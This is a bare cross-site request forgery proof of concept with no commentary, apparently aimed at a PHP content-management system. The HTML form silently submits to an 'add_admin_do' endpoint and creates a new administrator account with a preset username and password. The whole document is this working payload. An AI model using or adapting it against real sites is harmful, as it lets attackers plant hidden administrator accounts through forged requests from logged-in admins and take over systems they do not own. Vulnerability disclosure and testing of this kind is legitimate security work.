# CSRF
-----------------------
```
<html>
  <body>
    <form action="http://www.a.com:81/index.php?g=admin&c=admin&a=add_admin_do" method="POST">
      <input type="hidden" name="admin_role_id" value="1" />
      <input type="hidden" name="&m_userid" value="aaaa" />
      <input type="hidden" name="m_password" value="123123" />
      <input type="hidden" name="m_username" value="aaaa" />
      <input type="hidden" name="m_email" value="123@123.com" />
      <input type="hidden" name="member_model_id" value="1" />
      <input type="hidden" name="member_level_id" value="1" />
      <input type="hidden" name="m_status" value="1" />
      <input type="hidden" name="m_experience" value="0" />
      <input type="hidden" name="m_points" value="0" />
      <input type="hidden" name="m_reg_time" value="2018-12-29 14:43:25" />
      <input type="hidden" name="m_reg_ip" value="127.0.0.1" />
      <input type="hidden" name="m_login_time" value="2018-12-29 14:43:25" />
      <input type="hidden" name="m_login_ip" value="127.0.0.1" />
      <input type="hidden" name="timeKey" value="1546065805" />
      <input type="hidden" name="token" value="465b0c74" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
